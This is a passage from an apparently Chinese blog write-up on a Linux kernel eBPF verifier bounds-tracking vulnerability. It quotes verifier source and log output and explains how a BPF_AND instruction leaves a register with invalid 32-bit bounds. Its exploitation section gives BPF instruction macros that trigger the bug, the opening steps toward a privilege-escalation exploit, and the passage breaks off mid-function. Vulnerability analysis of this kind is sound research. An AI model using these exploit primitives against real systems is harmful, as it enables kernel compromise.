</span><span style="color:#c0c5ce;">		off_reg.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= SCALAR_VALUE;
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">__mark_reg_known</span><span style="color:#c0c5ce;">(&amp;off_reg, insn-&gt;imm);
</span><span style="color:#c0c5ce;">		src_reg = &amp;off_reg;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ptr_reg) </span><span style="color:#65737e;">/* pointer += K */
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">adjust_ptr_min_max_vals</span><span style="color:#c0c5ce;">(env, insn,
</span><span style="color:#c0c5ce;">						       ptr_reg, src_reg);
</span><span style="color:#c0c5ce;">	}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* This helper doesn&#39;t clear reg-&gt;id */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">___mark_reg_known</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">, u64 </span><span style="color:#bf616a;">imm</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_const</span><span style="color:#c0c5ce;">(imm);
</span><span style="color:#c0c5ce;">	reg-&gt;smin_value = (s64)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;smax_value = (s64)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;umin_value = imm;
</span><span style="color:#c0c5ce;">	reg-&gt;umax_value = imm;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	reg-&gt;s32_min_value = (s32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;s32_max_value = (s32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;u32_min_value = (u32)imm;
</span><span style="color:#c0c5ce;">	reg-&gt;u32_max_value = (u32)imm;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">/* Mark the unknown part of a register (variable offset or scalar value) as
</span><span style="color:#65737e;"> * known to have the value @imm.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__mark_reg_known</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">, u64 </span><span style="color:#bf616a;">imm</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Clear id, off, and union(map_ptr, range) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(((u8 *)reg) + sizeof(reg-&gt;type), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	       </span><span style="color:#8fa1b3;">offsetof</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state, var_off) - sizeof(reg-&gt;type));
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">___mark_reg_known</span><span style="color:#c0c5ce;">(reg, imm);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>BPF_ADD</code>中 根据源寄存器 设置了对应目的寄存器的边界值</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">scalar32_min_max_add</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				 </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;">	s32 smax_val = src_reg-&gt;s32_max_value;
</span><span style="color:#c0c5ce;">	u32 umin_val = src_reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;">	u32 umax_val = src_reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">signed_add32_overflows</span><span style="color:#c0c5ce;">(dst_reg-&gt;s32_min_value, smin_val) ||
</span><span style="color:#c0c5ce;">	    </span><span style="color:#8fa1b3;">signed_add32_overflows</span><span style="color:#c0c5ce;">(dst_reg-&gt;s32_max_value, smax_val)) {
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_min_value = S32_MIN;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_max_value = S32_MAX;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_min_value += smin_val;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;s32_max_value += smax_val;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||
</span><span style="color:#c0c5ce;">	    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) {
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_min_value = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_max_value = U32_MAX;
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_min_value += umin_val;
</span><span style="color:#c0c5ce;">		dst_reg-&gt;u32_max_value += umax_val;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<blockquote>
<p>解释为什么触发漏洞的BPF_AND指令中 dst_reg的u32_min/max是1</p>
</blockquote>
<p>回到上面<code>__update_reg32_bounds()</code>
进入该函数时 <code>{u,s}32_min_value = {u,s}32_max_value = 1</code>
而<code>var_off=0</code>
从而构造出有问题的寄存器</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">19: (5f) r6 &amp;= r3
</span><span style="color:#c0c5ce;">20: R0_w=inv0 R3_w=inv4294967298 R4_w=inv-4294967296 R6_w=inv(id=0,umax_value=4294967296,var_off=(0x0; 0x100000000),s32_min_value=1,s32_max_value=0,u32_min_value=1,u32_max_value=0)
</span></pre>
<p>在<code>adjust_scalar_min_max_vals()</code>最后还会再调用下面函数更新边界值</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* ALU32 ops are zero extended into 64bit register */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(alu32)
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">zext_32_to_64</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__update_reg_bounds</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg_deduce_bounds</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg_bound_offset</span><span style="color:#c0c5ce;">(dst_reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span></pre>
<p><code>__reg_deduce_bounds()</code>再做一次边界调整校验工作 32位和64位逻辑相同：</p>
<ul>
<li>若有符号最小值&gt;=0 或 有符号最大值 &lt; 0，则更新有/无符号最小值为<code>max(smin_value,umin_value)</code>，更新有/无符号最大值为<code>min(smax_value, umax_value)</code> 之后直接返回（有符号和无符号边界没有交叉，说明有无符号边界相同 合并）</li>
<li>若无符号最大值边界没有超过有符号范围（最高位不为1），则更新<code>smin_value</code>为<code>umin_value</code>，更新有/无符号最大值为<code>min(smax_value, umax_value)</code>（对smax取更严格的限制，安全将smin设为umin）</li>
<li>否则，若无符号最小值超过有符号范围（最高位为1），则更新有/无符号最小值为<code>max(smin_value,umin_value)</code>，更新<code>smax_value</code>为<code>umax_value</code>（对smin取更严格限制，安全将smax设为umax）</li>
</ul>
<blockquote>
<p>利用有符号信息改进无符号边界
利用无符号信息改进有符号边界</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Uses signed min/max values to inform unsigned, and vice-versa */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__reg32_deduce_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Learn sign from signed bounds.
</span><span style="color:#65737e;">	 * If we cannot cross the sign boundary, then signed and unsigned bounds
</span><span style="color:#65737e;">	 * are the same, so combine.  This works even in the negative case, e.g.
</span><span style="color:#65737e;">	 * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;s32_min_value &gt;= </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| reg-&gt;s32_max_value &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		reg-&gt;s32_min_value = reg-&gt;u32_min_value =
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);
</span><span style="color:#c0c5ce;">		reg-&gt;s32_max_value = reg-&gt;u32_max_value =
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Learn sign from unsigned bounds.  Signed bounds cross the sign
</span><span style="color:#65737e;">	 * boundary, so we must be careful.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((s32)reg-&gt;u32_max_value &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Positive.  We can&#39;t learn anything from the smin, but smax
</span><span style="color:#65737e;">		 * is positive, hence safe.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		reg-&gt;s32_min_value = reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;">		reg-&gt;s32_max_value = reg-&gt;u32_max_value =
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((s32)reg-&gt;u32_min_value &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Negative.  We can&#39;t learn anything from the smax, but smin
</span><span style="color:#65737e;">		 * is negative, hence safe.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		reg-&gt;s32_min_value = reg-&gt;u32_min_value =
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);
</span><span style="color:#c0c5ce;">		reg-&gt;s32_max_value = reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__reg64_deduce_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Learn sign from signed bounds.
</span><span style="color:#65737e;">	 * If we cannot cross the sign boundary, then signed and unsigned bounds
</span><span style="color:#65737e;">	 * are the same, so combine.  This works even in the negative case, e.g.
</span><span style="color:#65737e;">	 * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(reg-&gt;smin_value &gt;= </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| reg-&gt;smax_value &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		reg-&gt;smin_value = reg-&gt;umin_value = </span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(u64, reg-&gt;smin_value,
</span><span style="color:#c0c5ce;">							  reg-&gt;umin_value);
</span><span style="color:#c0c5ce;">		reg-&gt;smax_value = reg-&gt;umax_value = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(u64, reg-&gt;smax_value,
</span><span style="color:#c0c5ce;">							  reg-&gt;umax_value);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* Learn sign from unsigned bounds.  Signed bounds cross the sign
</span><span style="color:#65737e;">	 * boundary, so we must be careful.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((s64)reg-&gt;umax_value &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Positive.  We can&#39;t learn anything from the smin, but smax
</span><span style="color:#65737e;">		 * is positive, hence safe.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		reg-&gt;smin_value = reg-&gt;umin_value;
</span><span style="color:#c0c5ce;">		reg-&gt;smax_value = reg-&gt;umax_value = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(u64, reg-&gt;smax_value,
</span><span style="color:#c0c5ce;">							  reg-&gt;umax_value);
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((s64)reg-&gt;umin_value &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* Negative.  We can&#39;t learn anything from the smax, but smin
</span><span style="color:#65737e;">		 * is negative, hence safe.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		reg-&gt;smin_value = reg-&gt;umin_value = </span><span style="color:#8fa1b3;">max_t</span><span style="color:#c0c5ce;">(u64, reg-&gt;smin_value,
</span><span style="color:#c0c5ce;">							  reg-&gt;umin_value);
</span><span style="color:#c0c5ce;">		reg-&gt;smax_value = reg-&gt;umax_value;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__reg_deduce_bounds</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg32_deduce_bounds</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">__reg64_deduce_bounds</span><span style="color:#c0c5ce;">(reg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>__reg_bound_offset()</code>基于边界值重新计算<code>var_off</code>的值</p>
<ul>
<li><code>tnum_intersect()</code>取a、b共有的已知为1的位</li>
<li><code>tnum_range()</code> 取min中min、max的低位相同位部分，从第一个不同位开始设为已知</li>
</ul>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* Attempts to improve var_off based on unsigned min/max information */
</span><span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">__reg_bound_offset</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum var64_off = </span><span style="color:#8fa1b3;">tnum_intersect</span><span style="color:#c0c5ce;">(reg-&gt;var_off,
</span><span style="color:#c0c5ce;">					       </span><span style="color:#8fa1b3;">tnum_range</span><span style="color:#c0c5ce;">(reg-&gt;umin_value,
</span><span style="color:#c0c5ce;">							  reg-&gt;umax_value));
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum var32_off = </span><span style="color:#8fa1b3;">tnum_intersect</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">tnum_subreg</span><span style="color:#c0c5ce;">(reg-&gt;var_off),
</span><span style="color:#c0c5ce;">						</span><span style="color:#8fa1b3;">tnum_range</span><span style="color:#c0c5ce;">(reg-&gt;u32_min_value,
</span><span style="color:#c0c5ce;">							   reg-&gt;u32_max_value));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	reg-&gt;var_off = </span><span style="color:#8fa1b3;">tnum_or</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">tnum_clear_subreg</span><span style="color:#c0c5ce;">(var64_off), var32_off);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#65737e;">/* Note that if a and b disagree - i.e. one has a &#39;known 1&#39; where the other has
</span><span style="color:#65737e;"> * a &#39;known 0&#39; - this will return a &#39;known 1&#39; for that bit.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_intersect</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#bf616a;">b</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	u64 v, mu;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	v = a.</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">| b.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	mu = a.</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">&amp; b.</span><span style="color:#bf616a;">mask</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">TNUM</span><span style="color:#c0c5ce;">(v &amp; ~mu, mu);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum </span><span style="color:#8fa1b3;">tnum_range</span><span style="color:#c0c5ce;">(u64 </span><span style="color:#bf616a;">min</span><span style="color:#c0c5ce;">, u64 </span><span style="color:#bf616a;">max</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	u64 chi = min ^ max, delta;
</span><span style="color:#c0c5ce;">	u8 bits = </span><span style="color:#8fa1b3;">fls64</span><span style="color:#c0c5ce;">(chi); </span><span style="color:#65737e;">// 找到为1的最低位
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* special case, needed because 1ULL &lt;&lt; 64 is undefined */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bits &gt; </span><span style="color:#d08770;">63</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> tnum_unknown;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* e.g. if chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.
</span><span style="color:#65737e;">	 * if chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, so we return
</span><span style="color:#65737e;">	 *  constant min (since min == max).
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	delta = (</span><span style="color:#d08770;">1ULL </span><span style="color:#c0c5ce;">&lt;&lt; bits) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">TNUM</span><span style="color:#c0c5ce;">(min &amp; ~delta, delta);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>至此<code>adjust_scalar_min_max_vals()</code>函数结束，R6寄存器没有被修改</p>
<h3 id="lou-dong-li-yong">漏洞利用</h3><h3 id="gou-zao-bian-jie-zhi-1-0-ji-cun-qi">构造边界值[1,0]寄存器</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">VULN_REG BPF_REG_6
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__dst_reg</span><span style="color:#c0c5ce;">)                   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* get a pointer to bpf_array */                </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LD_MAP_FD</span><span style="color:#c0c5ce;">(BPF_REG_9, __map_fd),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_1, BPF_REG_9),            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_2, BPF_REG_10),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_2, -</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ST_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __idx),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_CALL, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, BPF_FUNC_map_lookup_elem), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* if success, r0 will be ptr to value, 0 for failed */              </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_JMP_IMM</span><span style="color:#c0c5ce;">(BPF_JNE, BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">(),                                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* mov the result back and clear R0 */          </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(__dst_reg, BPF_REG_0),            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* load value into r2, make it part-unknown */  </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, VULN_REG, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_4, </span><span style="color:#d08770;">0xffffffff</span><span style="color:#c0c5ce;">),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_LSH, BPF_REG_4, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, BPF_REG_4),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* r3 = 0x100000002 */                          </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_3, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),                  \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_LSH, BPF_REG_3, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_3, </span><span style="color:#d08770;">0x2</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* triger the vulnerability */                  </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, BPF_REG_3)
</span></pre>
<h3 id="gou-zao-yun-xing-shi-wei-1-verifier-que-xin-wei-0-de-ji-cun-qi">构造运行时为 1、verifier 确信为 0 的寄存器</h3><p>先构造出一个32位边界值为<code>[0,1]</code>、32位运行值为0的寄存器R7
将R7寄存器与R6相加
相加指令会检查是否有溢出，检查方式就是直接用边界值相加
这里R6+R7，进入第一个else分支 R6 32位有符号边界值变为<code>[1,1]</code>
接着进入第二个else分支 R6 32位有无边界值均成为<code>[1,1]</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">scalar32_min_max_add</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">dst_reg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				 </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_reg_state *</span><span style="color:#bf616a;">src_reg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	s32 smin_val = src_reg-&gt;s32_min_value;
</span><span style="color:#c0c5ce;">	s32 smax_val = src_reg-&gt;s32_max_value;
</span><span style="color:#c0c5ce;">	u32 umin_val = src_reg-&gt;u32_min_value;
</span><span style="color:#c0c5ce;">	u32 umax_val = src_reg-&gt;u32_max_value;
</span><span style="color:#c0c5ce;">
